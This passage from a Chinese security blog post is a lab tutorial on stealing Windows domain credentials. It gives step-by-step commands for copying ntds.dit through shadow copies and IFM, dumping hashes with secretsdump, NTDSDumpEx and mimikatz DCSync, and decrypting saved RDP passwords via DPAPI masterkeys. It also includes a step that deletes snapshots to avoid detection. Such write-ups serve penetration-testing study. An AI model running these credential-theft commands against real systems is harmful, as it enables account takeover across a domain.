+<h2 id="获取域控Ntds-dit文件"><a href="#获取域控Ntds-dit文件" class="headerlink" title="获取域控Ntds.dit文件"></a>获取域控Ntds.dit文件</h2><h3 id="使用卷影拷贝提取域控NTDS"><a href="#使用卷影拷贝提取域控NTDS" class="headerlink" title="使用卷影拷贝提取域控NTDS"></a><strong>使用卷影拷贝提取域控NTDS</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从Windows XP SP2和Windows Server 2003开始，windows中引入了一项名叫卷影拷贝的服务。这种服务允许Windows系统以自动或手动的方式对文件或磁盘当前状态进行备份（或快照），即使文件处于打开状态下该服务仍然可以直接进行文件备份。Ntds.dit是默认被Windows系统锁定的，想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy Service，VSS)，得到Ntds.dit文件的副本。卷影拷贝服务(VSS)本质上是属于快照技术的一种，主要用于备份和恢复，即使目标文件被处于锁定状态。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>ntdsutil.exe工具拷贝</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe是一个为活动目录提供管理机制的命令行工具，该工具默认安装在域控服务器上，可以在域控制器上直接操作，2003、2008、2012、2016等</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一步：创建一个NTDS快照</strong>（如果使用administrator或者其他通过uac认证的账户出现如下的提示，我们可以</p>
+<p>使用令牌将权限切换到system），我们实验时不知道为什么没有出现错误</p>
+<p><img src="/images/image-20231029200500888.png" alt="image-20231029200500888"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个NTDS快照</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029195511614.png" alt="image-20231029195511614"></p>
+<p><strong>第二步：加载快照到磁盘</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;mount &#123;ba8078cf-af0b-4826-81ba-2ce9737429b6&#125;&quot; q q</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">加载快照到磁盘</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029195840455.png" alt="image-20231029195840455"></p>
+<p><strong>第三步：复制快照中的ntds.dit文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy &#x27;快照地址\Windows\NTDS\ntds.dit&#x27; 目标地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">copy c:\$SNAP_202310291951_VOLUMEC$\Windows\NTDS\ntds.dit c:\<span class="built_in">users</span>\administrator\desktop</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029200212693.png" alt="image-20231029200212693"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell dir c:\users\administrator\desktop </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目录下文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029200131911.png" alt="image-20231029200131911"></p>
+<p><strong>第四步：删除快照</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;umount &#123;ba8078cf-af0b-4826-81ba-2ce9737429b6&#125;&quot; </span><br><span class="line">&quot;delete &#123;ba8078cf-af0b-4826-81ba-2ce9737429b6&#125;&quot; q q</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除快照，防止被发现</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029200838105.png" alt="image-20231029200838105"></p>
+<h3 id="使用vssadmin进行NTDS拷贝"><a href="#使用vssadmin进行NTDS拷贝" class="headerlink" title="使用vssadmin进行NTDS拷贝"></a>使用vssadmin进行NTDS拷贝</h3><p>vssadmin是Windows Server 2008及Windows 7系统以上提供的VSS管理工具，它可以用于</p>
+<p>创建或删除卷影副本，列出卷影副本的信息，他需要两步就可以进行提取NTDS文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个C盘快照</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029202243747.png" alt="image-20231029202243747"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit c:\users\administrator\desktop</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ntds.dit复制出来</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029202014359.png" alt="image-20231029202014359"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除快照</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029202141001.png" alt="image-20231029202141001"></p>
+<h3 id="IFM方式进行拷贝"><a href="#IFM方式进行拷贝" class="headerlink" title="IFM方式进行拷贝"></a>IFM方式进行拷贝</h3><p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，</p>
+<p>需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>
+
+<p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p>
+<p><img src="/images/image-20231029203448162.png" alt="image-20231029203448162"></p>
+<p><img src="/images/image-20231029203437040.png" alt="image-20231029203437040"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\test\Active Directory\ntds.dit&quot; c:\users\administrator\desktop</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029203624834.png" alt="image-20231029203624834"></p>
+<h2 id="读取Ntds-dit文件"><a href="#读取Ntds-dit文件" class="headerlink" title="读取Ntds.dit文件"></a>读取Ntds.dit文件</h2><p>在线和离线读取方法都很多，这里选择了个人习惯的方法举例。</p>
+<h3 id="离线读取"><a href="#离线读取" class="headerlink" title="离线读取"></a>离线读取</h3><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>
+<p>system.hive的导出方法在sam文件读取中有提到</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell reg save hklm\system system.hive</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导出system.hive文件</span></span><br></pre></td></tr></table></figure>
+
+<p>下载到本地后，可以选择很多种工具进行文件解析，</p>
+<p><strong>secretsdump</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029210736954.png" alt="image-20231029210736954"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">aad3b435b51404eeaad3b435b51404ee#</span><span class="language-bash">表示禁用状态</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以利用impacket中的secrets dump.py脚本执行</p>
+<p><img src="/images/image-20231030110616217.png" alt="image-20231030110616217"></p>
+<p><strong>NTDSDumpEx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030104833882.png" alt="image-20231030104833882"></p>
+<h3 id="在线读取"><a href="#在线读取" class="headerlink" title="在线读取"></a>在线读取</h3><p>在线读取的问题：<strong>工具是否被杀软杀掉</strong></p>
+<p><strong>mimikatz读取</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /csv</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">读取域内所有用户</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030113243554.png" alt="image-20231030113243554"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /liukaifeng01 /csv</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">读取指定用户</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dcsync攻击"><a href="#Dcsync攻击" class="headerlink" title="Dcsync攻击"></a>Dcsync攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">什么是Dcsync（domain Controller synchronization ）:域控同步:在内网中一般不是一个域控，</span><br><span class="line">会有域树或者域森林等，域控之间是要同步数据的,不同的域控15分钟之间要发起一次数据同</span><br><span class="line">步的请求，请求里面就包含同步的数据，这里采用的协议是DRS(目录复制服务)，这个就是</span><br><span class="line">DCsy</span><br></pre></td></tr></table></figure>
+
+<p>能使用DRS服务的用户（拥有dcsync的用户）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Administrators组内的用户</span><br><span class="line"></span><br><span class="line">2. Domain Admins组内的用户</span><br><span class="line"></span><br><span class="line">3. Enterprise Admins组内的用户</span><br><span class="line"></span><br><span class="line">4. 域控制器的计算机帐户</span><br><span class="line"></span><br><span class="line">域控的Administrator 和 system 也可以</span><br></pre></td></tr></table></figure>
+
+
+
+<p>关于Dcsync的利用思路</p>
+<p>1、找到有权限的用户，从而远程读取域控用户信息，可以进行PTH 黄金 白银<strong>票据攻击</strong></p>
+<p>2、如果控制了域控，可以在域控添加一个管理员账号从而进行<strong>权限维持</strong></p>
+<p>3、可以添加一个普通的用户，修改ACL从而实现可以使用Dcsync，进行权限维持</p>
+<h3 id="利用Dcsync远程读取域控hash"><a href="#利用Dcsync远程读取域控hash" class="headerlink" title="利用Dcsync远程读取域控hash"></a>利用Dcsync远程读取域控hash</h3><p>mimikatz： DCSync 功能。该功能可以<strong>模仿一个域控制器</strong>，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控制器上的的数据。</p>
+<ol>
+<li>找符合条件用户（拥有dcsync的用户）</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:abc.com /all /csv   #读取所有用户</span><br><span class="line">lsadump::dcsync /domain:abc.com /user:administrator #读取单个用户</span><br></pre></td></tr></table></figure>
+
+<p>用god\liukaifeng01 普通domain users用户登录无法读取</p>
+<p><img src="/images/image-20231030131422386.png" alt="image-20231030131422386"></p>
+<p>切换为god\administrator用户后可以抓取</p>
+<p><img src="/images/image-20231030131647908.png" alt="image-20231030131647908"></p>
+<h3 id="利用Dcsync远程读取明文密码"><a href="#利用Dcsync远程读取明文密码" class="headerlink" title="利用Dcsync远程读取明文密码"></a>利用Dcsync远程读取明文密码</h3><p>因为账户勾选了”使用可逆加密存储密码”的属性，利用DCSync可以获取明文凭据</p>
+<p><img src="/images/image-20231030132325393.png" alt="image-20231030132325393"></p>
+<p>添加“可逆加密存储密码”后，还需要对密码进行修改才能使其生效。</p>
+<p><img src="/images/image-20231030132439301.png" alt="image-20231030132439301"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.exe 域名/用户名或者hash:密码@IP (域控ip)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">secretsdump.exe god/administrator@172.20.10.4，会提示输入密码，所以这个攻击前提在得知有符合条件的账户密码情况下使用</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030133854332.png" alt="image-20231030133854332"></p>
+<h1 id="RDP明文密码抓取"><a href="#RDP明文密码抓取" class="headerlink" title="RDP明文密码抓取"></a>RDP明文密码抓取</h1><p>RDP–远程桌面协议</p>
+<p>管理员为了方便管理计算机，经常会进行远程桌面连接，由于每次都需要输入密码觉得麻烦，就点击了<strong>保留凭据</strong>，这个过程是可逆，所以我们可以将保存的密码进行还原。</p>
+<p>还原的原理：Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还</p>
+<p>需要解密使用这个密码，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来</p>
+<h3 id="抓取实验"><a href="#抓取实验" class="headerlink" title="抓取实验"></a>抓取实验</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域控机器：192.168.52.138  </span><br><span class="line"></span><br><span class="line">控制靶机：192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<p>先在域控机器上开启远程桌面，并且首先控制靶机进行一个远程连接尝试。（<strong>勾选记住凭据</strong>）</p>
+<p><img src="/images/image-20231030190643674.png" alt="image-20231030190643674"></p>
+<p><img src="/images/image-20231030190738811.png" alt="image-20231030190738811"></p>
+<p><strong>查看当前保存的凭据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查看mstsc的连接记录</span><br><span class="line"></span><br><span class="line">命令：cmdkey /list</span><br><span class="line"></span><br><span class="line">2、查找本地的Credentials</span><br><span class="line"></span><br><span class="line">命令：dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030191645861.png" alt="image-20231030191645861"></p>
+<p><img src="/images/image-20231030191636457.png" alt="image-20231030191636457"></p>
+<h2 id="读取RDP明文密码"><a href="#读取RDP明文密码" class="headerlink" title="读取RDP明文密码"></a>读取RDP明文密码</h2><ol>
+<li>使用mimikatz获取该文件的MasterKey的guid</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\54461880A4E364919FB23518091F65E1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030193043730.png" alt="image-20231030193043730"></p>
+<ol start="2">
+<li>找到上述guid对应的masterkey值</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030195235635.png" alt="image-20231030195235635"></p>
+<ol start="3">
+<li>mimikatz通过MasterKey值去解密凭据文件</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\54461880A4E364919FB23518091F65E1 /masterkey:e7e7aaaace37b97b28f89f64910ab639b7eb2d7d0ae1c66cd56a214ed4b286b0597ab759e88cd118b25396e43526434908c4c2222475746ae58d38a3250d0f72</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dpapi::cred /in:凭据文件路径 /masterkey:masterkey值</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231030200129752.png" alt="image-20231030200129752"></p>
+<h2 id="离线读取RDP明文密码"><a href="#离线读取RDP明文密码" class="headerlink" title="离线读取RDP明文密码"></a>离线读取RDP明文密码</h2><p>首先通过任务管理器导出lsass.exe</p>
+<p><img src="/images/image-20231031101944551.png" alt="image-20231031101944551"></p>
+<p>同时需要把凭据下载到本地</p>
+<p><img src="/images/image-20231031102520400.png" alt="image-20231031102520400"></p>
+<p>这里如果在文件夹中 查看是无法直接查看的，因为是隐藏文件，需要修改隐藏设置。</p>
+<p><img src="/images/image-20231031102922378.png" alt="image-20231031102922378"></p>
+<p><img src="/images/image-20231031103149122.png" alt="image-20231031103149122"></p>
+<p>获取凭据的masterkey uid值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:凭据路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231031103653213.png" alt="image-20231031103653213"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p>找到masterkey uid对应的masterkey值</p>
+<p><img src="/images/image-20231031103938078.png" alt="image-20231031103938078"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:凭据路径 /masterkey:masterkey值</span><br></pre></td></tr></table></figure>
+
+<p>解密读取</p>
+<p><img src="/images/image-20231031104445663.png" alt="image-20231031104445663"></p>
+<p>（这里虚拟机有点问题，不能复制，就贴之前的图片了）</p>
+<h2 id="读取系统应用密码"><a href="#读取系统应用密码" class="headerlink" title="读取系统应用密码"></a>读取系统应用密码</h2><p>系统应用：浏览器、其他各类软件</p>
+<p>通过cs自带插件或者Sharp-HackBrowserData.exe可以获取</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack.top">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack.top/2023/10/31/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">https://drblack.top/2023/10/31/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack.top" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/20/upload-labs%20Pass1-21%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%20/" title="upload-labs Pass1-21通关笔记(详细版)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">upload-labs Pass1-21通关笔记(详细版)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/08/MAC%E5%AF%BC%E5%85%A5%E9%9D%B6%E6%9C%BA/" title="MAC导入红日靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-08</div><div class="title">MAC导入红日靶机</div></div></a></div><div><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="Nginx解析漏洞复现及原理解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-25</div><div class="title">Nginx解析漏洞复现及原理解析</div></div></a></div><div><a href="/2023/10/20/upload-labs%20Pass1-21%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%20/" title="upload-labs Pass1-21通关笔记(详细版)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-20</div><div class="title">upload-labs Pass1-21通关笔记(详细版)</div></div></a></div><div><a href="/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" title="HVV中级蓝队常见面试问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-21</div><div class="title">HVV中级蓝队常见面试问题</div></div></a></div><div><a href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">一段简述</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">重要性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mimikatz%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">mimikatz命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">密码抓取原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BBSAM%E4%B8%ADHASH"><span class="toc-number">3.1.</span> <span class="toc-text">在线读SAM中HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96SAM%E4%B8%ADHASH"><span class="toc-number">3.2.</span> <span class="toc-text">离线读取SAM中HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96Lsass%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">在线读取Lsass进程内存密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96Lsass%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">离线读取Lsass进程内存密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">高版本明文密码抓取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Wdigest%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">4.1.</span> <span class="toc-text">修改Wdigest注册表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">SSP注入内存获取系统密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP%E6%B3%A8%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">4.3.</span> <span class="toc-text">SSP注入注册表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">抓取域控上的账号密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7Ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.</span> <span class="toc-text">获取域控Ntds.dit文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7NTDS"><span class="toc-number">5.1.1.</span> <span class="toc-text">使用卷影拷贝提取域控NTDS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8vssadmin%E8%BF%9B%E8%A1%8CNTDS%E6%8B%B7%E8%B4%9D"><span class="toc-number">5.1.2.</span> <span class="toc-text">使用vssadmin进行NTDS拷贝</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IFM%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%8B%B7%E8%B4%9D"><span class="toc-number">5.1.3.</span> <span class="toc-text">IFM方式进行拷贝</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96Ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-number">5.2.</span> <span class="toc-text">读取Ntds.dit文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96"><span class="toc-number">5.2.1.</span> <span class="toc-text">离线读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96"><span class="toc-number">5.2.2.</span> <span class="toc-text">在线读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dcsync%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">Dcsync攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Dcsync%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E5%9F%9F%E6%8E%A7hash"><span class="toc-number">5.3.1.</span> <span class="toc-text">利用Dcsync远程读取域控hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Dcsync%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">5.3.2.</span> <span class="toc-text">利用Dcsync远程读取明文密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 